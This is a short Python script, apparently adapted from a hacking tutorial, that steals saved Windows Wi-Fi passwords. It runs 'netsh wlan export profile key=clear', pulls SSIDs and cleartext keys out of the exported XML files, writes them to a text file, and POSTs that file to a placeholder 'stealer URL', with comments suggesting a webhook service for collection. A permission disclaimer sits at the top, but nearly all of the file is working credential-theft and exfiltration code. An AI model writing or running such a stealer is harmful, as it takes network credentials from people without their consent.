#!/usr/bin/env python3
#**!!Both of these were made from tutorials of TCM-The Cyber Mentor!!**
#https://github.com/hmaverickadams
#!! WARNING !! This is just a proof of concept is is not meant for any real world application. DO NOT USE this script on any systems you don't have written, explicit permission for owner to do so USE At OWN RISK, I am not responsible for ANY out come due to the usage of this script. !! WARNING !!

# Specifically to steal Windows Wifi Passwords
import subprocess
import os
import sys
import requests # may need to install this separately as it is not standard

# To ship out pass could use a site like Webhook.site
# unique url copy it and use it here
#### Stealer URL
url = 'https://someurl.com'


# Create a file
password_file = open('passowrds.txt', "w")
password_file.write("Sneaky! The passwords you requested:\n\n")
password_file.close()

# Lists
wifi_files = []
wifi_name = []
wifi_pass = []

# user python to exec windows cmd
commmand = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True).stdout.decode()

# Grab working dir
path = os.getcwd()

# HAck That Shit
for filename in os.listdir(path):
    if filename.startswith("Wi-Fi") and filename.endswith(".xml"):
        wifi_files.append(filename)
        for i in wifi_files:
            with open(i, 'r') as f:
                for line in f.readlines():
                    if 'name' in line:
                        stripped = line.strip()
                        front = stripped[6:]
                        back = front[:-7]
                        wifi_name.append(back)
                    if 'keyMaterial' in line:
                        stripped = line.strip()
                        front = stripped[13:]
                        back = front[:-14]
                        wifi_pass.append(back)
                        for x, y in zip(wifi_name, wifi_pass):
                            sys.stdout = open("passwords.txt", "a")
                            print("SSID: "+x, "Pass: "+y, sep='\n')
                            sys.stdout.close()

# Send that Hack
with open('passwords.txt', 'rb') as f:
    r = requests.post(url, data=f)
